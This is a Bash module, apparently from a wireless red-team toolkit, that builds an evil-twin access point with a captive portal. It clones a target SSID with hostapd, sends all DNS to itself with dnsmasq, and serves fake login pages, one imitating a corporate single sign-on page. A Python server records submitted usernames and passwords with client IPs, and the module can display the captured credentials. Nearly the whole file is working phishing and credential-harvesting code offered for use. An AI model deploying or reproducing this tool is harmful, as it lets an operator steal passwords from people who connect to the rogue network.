#!/bin/bash
# Evil Twin AP with optional captive portal

rt_evil_twin() {
  local choice
  choice=$(menu_pick "Evil Twin" \
    "Clone Target AP" \
    "Start Captive Portal" \
    "Stop Evil Twin" \
    "View Captured Credentials")
  
  case "$choice" in
    1) evil_twin_clone ;;
    2) evil_twin_portal ;;
    3) evil_twin_stop ;;
    4) evil_twin_creds ;;
    0|"") return ;;
  esac
}

evil_twin_clone() {
  if ! check_passive; then
    LOG red "PASSIVE_ONLY enabled - evil twin blocked"
    return 1
  fi
  
  if ! confirm_danger "Start Evil Twin AP? This will broadcast a rogue access point."; then
    return 1
  fi
  
  local ssid
  ssid=$(TEXT_PICKER "Target SSID to clone" "Corporate-WiFi")
  case $? in "$DUCKYSCRIPT_CANCELLED"|"$DUCKYSCRIPT_REJECTED"|"$DUCKYSCRIPT_ERROR") return ;; esac
  
  local channel
  channel=$(NUMBER_PICKER "Channel" 6)
  case $? in "$DUCKYSCRIPT_CANCELLED"|"$DUCKYSCRIPT_REJECTED"|"$DUCKYSCRIPT_ERROR") return ;; esac
  
  local iface
  iface=$(TEXT_PICKER "Interface" "wlan1")
  case $? in "$DUCKYSCRIPT_CANCELLED"|"$DUCKYSCRIPT_REJECTED"|"$DUCKYSCRIPT_ERROR") return ;; esac
  
  LOG blue "Starting Evil Twin: $ssid on channel $channel"
  
  local hostapd_conf="$ARTIFACT_DIR/hostapd_evil.conf"
  ensure_dir "$ARTIFACT_DIR"
  
  cat > "$hostapd_conf" << EOF
interface=$iface
driver=nl80211
ssid=$ssid
channel=$channel
hw_mode=g
wmm_enabled=0
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wpa=0
EOF

  if have hostapd; then
    hostapd -B "$hostapd_conf" 2>/dev/null
    
    if [[ $? -eq 0 ]]; then
      LOG green "Evil Twin AP started: $ssid"
      LOG ""
      LOG "Clients connecting to this AP will:"
      LOG "  - Get DHCP from Pager (if configured)"
      LOG "  - Have traffic routed through Pager"
      LOG ""
      LOG "Stop with: Evil Twin > Stop Evil Twin"
    else
      LOG red "Failed to start hostapd"
    fi
  else
    LOG red "hostapd required"
    LOG "Install or use laptop mode"
  fi
}

evil_twin_portal() {
  if ! check_passive; then
    LOG red "PASSIVE_ONLY enabled"
    return 1
  fi
  
  if ! confirm_danger "Start captive portal? This will intercept HTTP traffic."; then
    return 1
  fi
  
  local ssid
  ssid=$(TEXT_PICKER "SSID" "Free-WiFi")
  case $? in "$DUCKYSCRIPT_CANCELLED"|"$DUCKYSCRIPT_REJECTED"|"$DUCKYSCRIPT_ERROR") return ;; esac
  
  local iface
  iface=$(TEXT_PICKER "Interface" "wlan1")
  case $? in "$DUCKYSCRIPT_CANCELLED"|"$DUCKYSCRIPT_REJECTED"|"$DUCKYSCRIPT_ERROR") return ;; esac
  
  local portal_type
  portal_type=$(menu_pick "Portal Type" \
    "Generic Login" \
    "Corporate SSO Clone" \
    "WiFi Terms & Conditions")
  
  case "$portal_type" in
    0|"") return ;;
  esac
  
  LOG blue "Starting captive portal..."
  
  ensure_dir "$ARTIFACT_DIR/portal"
  local creds_file="$ARTIFACT_DIR/portal/captured_creds.txt"
  
  create_portal_page "$portal_type"
  
  local hostapd_conf="$ARTIFACT_DIR/hostapd_portal.conf"
  cat > "$hostapd_conf" << EOF
interface=$iface
driver=nl80211
ssid=$ssid
channel=6
hw_mode=g
wmm_enabled=0
auth_algs=1
wpa=0
EOF

  if have hostapd && have dnsmasq; then
    hostapd -B "$hostapd_conf" 2>/dev/null
    
    local dnsmasq_conf="$ARTIFACT_DIR/dnsmasq_portal.conf"
    local gateway="10.0.0.1"
    
    ifconfig "$iface" "$gateway" netmask 255.255.255.0 up 2>/dev/null
    
    cat > "$dnsmasq_conf" << EOF
interface=$iface
dhcp-range=10.0.0.10,10.0.0.100,12h
address=/#/$gateway
EOF

    dnsmasq -C "$dnsmasq_conf" 2>/dev/null
    
    start_portal_server "$gateway" "$creds_file" &
    
    LOG green "Captive portal running"
    LOG "SSID: $ssid"
    LOG "Gateway: $gateway"
    LOG "Credentials saved to: $creds_file"
  else
    LOG red "hostapd and dnsmasq required"
  fi
}

create_portal_page() {
  local portal_type="$1"
  local html_file="$ARTIFACT_DIR/portal/index.html"
  
  case "$portal_type" in
    1)
      cat > "$html_file" << 'HTMLEOF'
<!DOCTYPE html>
<html>
<head><title>WiFi Login</title>
<style>body{font-family:Arial;margin:50px;background:#f0f0f0}
.box{background:white;padding:30px;max-width:400px;margin:auto;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,0.1)}
input{width:100%;padding:10px;margin:10px 0;box-sizing:border-box}
button{width:100%;padding:12px;background:#007bff;color:white;border:none;cursor:pointer}</style>
</head>
<body><div class="box">
<h2>WiFi Login Required</h2>
<form method="POST" action="/login">
<input name="username" placeholder="Username" required>
<input name="password" type="password" placeholder="Password" required>
<button type="submit">Connect</button>
</form></div></body></html>
HTMLEOF
      ;;
    2)
      cat > "$html_file" << 'HTMLEOF'
<!DOCTYPE html>
<html>
<head><title>Corporate SSO</title>
<style>body{font-family:Segoe UI,Arial;margin:0;background:#f3f3f3}
.header{background:#0078d4;padding:20px;color:white}
.box{background:white;padding:30px;max-width:400px;margin:40px auto;border-radius:4px}
input{width:100%;padding:12px;margin:8px 0;border:1px solid #ddd;box-sizing:border-box}
button{width:100%;padding:12px;background:#0078d4;color:white;border:none}</style>
</head>
<body>
<div class="header"><h2>Sign in to your account</h2></div>
<div class="box">
<form method="POST" action="/login">
<input name="username" placeholder="someone@example.com" required>
<input name="password" type="password" placeholder="Password" required>
<button type="submit">Sign in</button>
</form></div></body></html>
HTMLEOF
      ;;
    3)
      cat > "$html_file" << 'HTMLEOF'
<!DOCTYPE html>
<html>
<head><title>WiFi Terms</title>
<style>body{font-family:Arial;margin:50px;background:#fff}
.box{max-width:600px;margin:auto}
button{padding:15px 40px;background:#28a745;color:white;border:none;font-size:16px}</style>
</head>
<body><div class="box">
<h2>Welcome to Free WiFi</h2>
<p>By clicking Accept, you agree to our Terms of Service.</p>
<form method="POST" action="/login">
<input type="hidden" name="accepted" value="true">
<button type="submit">Accept & Connect</button>
</form></div></body></html>
HTMLEOF
      ;;
  esac
}

start_portal_server() {
  local gateway="$1"
  local creds_file="$2"
  local portal_dir="$ARTIFACT_DIR/portal"
  
  if have python3; then
    python3 << PYEOF &
import http.server
import socketserver
import urllib.parse
import os

PORT = 80
CREDS_FILE = "$creds_file"
PORTAL_DIR = "$portal_dir"

class PortalHandler(http.server.SimpleHTTPRequestHandler):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, directory=PORTAL_DIR, **kwargs)
    
    def do_POST(self):
        length = int(self.headers.get('Content-Length', 0))
        data = self.rfile.read(length).decode('utf-8')
        params = urllib.parse.parse_qs(data)
        
        with open(CREDS_FILE, 'a') as f:
            f.write(f"[{os.popen('date').read().strip()}] ")
            f.write(f"IP: {self.client_address[0]} ")
            for k, v in params.items():
                f.write(f"{k}={v[0]} ")
            f.write("\\n")
        
        self.send_response(302)
        self.send_header('Location', 'http://example.com')
        self.end_headers()

with socketserver.TCPServer(("", PORT), PortalHandler) as httpd:
    httpd.serve_forever()
PYEOF
  elif have nc; then
    while true; do
      echo -e "HTTP/1.1 200 OK\r\n\r\n$(cat "$portal_dir/index.html")" | nc -l -p 80 -q 1 >> "$creds_file" 2>/dev/null
    done &
  else
    LOG red "python3 or nc required for portal"
  fi
}

evil_twin_stop() {
  LOG blue "Stopping Evil Twin..."
  
  pkill -f hostapd 2>/dev/null || true
  pkill -f dnsmasq 2>/dev/null || true
  pkill -f "portal" 2>/dev/null || true
  
  LOG green "Evil Twin stopped"
}

evil_twin_creds() {
  local creds_file="$ARTIFACT_DIR/portal/captured_creds.txt"
  
  if [[ -f "$creds_file" ]]; then
    LOG blue "Captured credentials:"
    LOG ""
    cat "$creds_file"
    
    local count
    count=$(wc -l < "$creds_file")
    LOG ""
    LOG "Total: $count entries"
  else
    LOG "No credentials captured yet"
  fi
}
